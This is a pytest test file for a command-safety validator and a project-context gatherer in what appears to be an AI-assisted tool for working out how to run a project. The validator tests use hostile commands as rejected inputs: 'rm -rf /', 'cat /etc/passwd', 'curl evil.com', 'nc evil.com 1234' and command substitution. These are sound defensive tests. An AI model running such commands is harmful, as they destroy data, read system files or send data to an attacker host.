"""Tests for run_analyzer module (RFC-066)."""

import json
from pathlib import Path

import pytest

from sunwell.tools.run_analyzer import (
    CommandValidationError,
    Prerequisite,
    RunAnalysis,
    RunCommand,
    gather_project_context,
    validate_command_safety,
)


class TestValidateCommandSafety:
    """Tests for command safety validation."""

    def test_valid_npm_commands(self):
        """Valid npm commands should pass."""
        validate_command_safety("npm run dev")
        validate_command_safety("npm start")
        validate_command_safety("npm run build")
        validate_command_safety("npm test")

    def test_valid_python_commands(self):
        """Valid Python commands should pass."""
        validate_command_safety("python main.py")
        validate_command_safety("python3 -m flask run")
        validate_command_safety("python -m uvicorn app:app")
        validate_command_safety("uv run python main.py")

    def test_valid_cargo_commands(self):
        """Valid Cargo commands should pass."""
        validate_command_safety("cargo run")
        validate_command_safety("cargo build --release")
        validate_command_safety("cargo test")

    def test_valid_docker_commands(self):
        """Valid Docker commands should pass."""
        validate_command_safety("docker-compose up")
        validate_command_safety("docker run myimage")

    def test_valid_make_commands(self):
        """Valid make commands should pass."""
        validate_command_safety("make run")
        validate_command_safety("make dev")

    def test_empty_command_rejected(self):
        """Empty commands should be rejected."""
        with pytest.raises(CommandValidationError, match="Empty command"):
            validate_command_safety("")
        with pytest.raises(CommandValidationError, match="Empty command"):
            validate_command_safety("   ")

    def test_unknown_binary_rejected(self):
        """Unknown binaries should be rejected."""
        with pytest.raises(CommandValidationError, match="not in allowlist"):
            validate_command_safety("unknown_binary arg1")
        with pytest.raises(CommandValidationError, match="not in allowlist"):
            validate_command_safety("bash script.sh")
        with pytest.raises(CommandValidationError, match="not in allowlist"):
            validate_command_safety("sh -c 'echo hi'")

    def test_rm_rejected(self):
        """rm commands should be rejected."""
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev && rm -rf /")

    def test_sudo_rejected(self):
        """sudo commands should be rejected."""
        # sudo is rejected because it's not in the allowlist
        with pytest.raises(CommandValidationError, match="not in allowlist"):
            validate_command_safety("sudo npm run dev")
        # sudo pattern in the middle of a command is also rejected
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev && sudo whoami")

    def test_shell_injection_rejected(self):
        """Shell injection patterns should be rejected."""
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev; cat /etc/passwd")
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev && curl evil.com")
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev | nc evil.com 1234")

    def test_command_substitution_rejected(self):
        """Command substitution should be rejected."""
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run $(whoami)")
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run `whoami`")

    def test_redirect_rejected(self):
        """Redirects should be rejected."""
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev > /dev/null")
        with pytest.raises(CommandValidationError, match="dangerous pattern"):
            validate_command_safety("npm run dev >> log.txt")


class TestGatherProjectContext:
    """Tests for project context gathering."""

    def test_gathers_package_json(self, tmp_path: Path):
        """Should include package.json content."""
        package_json = {
            "name": "test-project",
            "scripts": {"dev": "vite", "start": "node index.js"},
        }
        (tmp_path / "package.json").write_text(json.dumps(package_json))

        context = gather_project_context(tmp_path)

        assert "package.json" in context
        assert "vite" in context["package.json"]

    def test_detects_node_modules(self, tmp_path: Path):
        """Should detect node_modules presence."""
        (tmp_path / "node_modules").mkdir()

        context = gather_project_context(tmp_path)

        assert context["has_node_modules"] is True

    def test_detects_venv(self, tmp_path: Path):
        """Should detect venv presence."""
        (tmp_path / ".venv").mkdir()

        context = gather_project_context(tmp_path)

        assert context["has_venv"] is True

    def test_detects_cargo_target(self, tmp_path: Path):
        """Should detect Cargo target directory."""
        (tmp_path / "target").mkdir()

        context = gather_project_context(tmp_path)

        assert context["has_target"] is True

    def test_lists_files(self, tmp_path: Path):
        """Should list top-level files."""
        (tmp_path / "main.py").write_text("print('hello')")
        (tmp_path / "requirements.txt").write_text("flask==2.0.0")
        (tmp_path / "src").mkdir()

        context = gather_project_context(tmp_path)

        assert "main.py" in context["files"]
        assert "requirements.txt" in context["files"]
        assert "src/" in context["files"]

    def test_truncates_large_files(self, tmp_path: Path):
        """Should truncate files larger than 5000 chars."""
        large_content = "x" * 10000
        (tmp_path / "README.md").write_text(large_content)

        context = gather_project_context(tmp_path)

        assert len(context["README.md"]) <= 5000


class TestRunAnalysis:
    """Tests for RunAnalysis dataclass."""

    def test_to_dict_camel_case(self):
        """to_dict should use camelCase keys."""
        analysis = RunAnalysis(
            project_type="React app",
            language="TypeScript",
            command="npm run dev",
            command_description="Start dev server",
            confidence="high",
            expected_port=5173,
        )

        d = analysis.to_dict()

        assert "projectType" in d
        assert "commandDescription" in d
        assert "expectedPort" in d
        assert d["projectType"] == "React app"
        assert d["source"] == "ai"
        assert d["fromCache"] is False

    def test_with_prerequisites(self):
        """Should serialize prerequisites correctly."""
        analysis = RunAnalysis(
            project_type="Node.js app",
            language="JavaScript",
            command="npm start",
            command_description="Start server",
            confidence="high",
            prerequisites=(
                Prerequisite(
                    description="Install dependencies",
                    command="npm install",
                    satisfied=False,
                    required=True,
                ),
            ),
        )

        d = analysis.to_dict()

        assert len(d["prerequisites"]) == 1
        assert d["prerequisites"][0]["satisfied"] is False
        assert d["prerequisites"][0]["required"] is True

    def test_with_alternatives(self):
        """Should serialize alternatives correctly."""
        analysis = RunAnalysis(
            project_type="Node.js app",
            language="JavaScript",
            command="npm run dev",
            command_description="Start dev server",
            confidence="high",
            alternatives=(
                RunCommand(
                    command="npm run build",
                    description="Build for production",
                    when="for deployment",
                ),
            ),
        )

        d = analysis.to_dict()

        assert len(d["alternatives"]) == 1
        assert d["alternatives"][0]["command"] == "npm run build"
        assert d["alternatives"][0]["when"] == "for deployment"


class TestRunCommand:
    """Tests for RunCommand dataclass."""

    def test_to_dict_without_when(self):
        """to_dict should omit 'when' if not set."""
        cmd = RunCommand(command="npm start", description="Start server")

        d = cmd.to_dict()

        assert "when" not in d
        assert d["command"] == "npm start"

    def test_to_dict_with_when(self):
        """to_dict should include 'when' if set."""
        cmd = RunCommand(command="npm run build", description="Build", when="for production")

        d = cmd.to_dict()

        assert d["when"] == "for production"


class TestPrerequisite:
    """Tests for Prerequisite dataclass."""

    def test_to_dict(self):
        """Should serialize all fields."""
        prereq = Prerequisite(
            description="Install Node dependencies",
            command="npm install",
            satisfied=False,
            required=True,
        )

        d = prereq.to_dict()

        assert d["description"] == "Install Node dependencies"
        assert d["command"] == "npm install"
        assert d["satisfied"] is False
        assert d["required"] is True
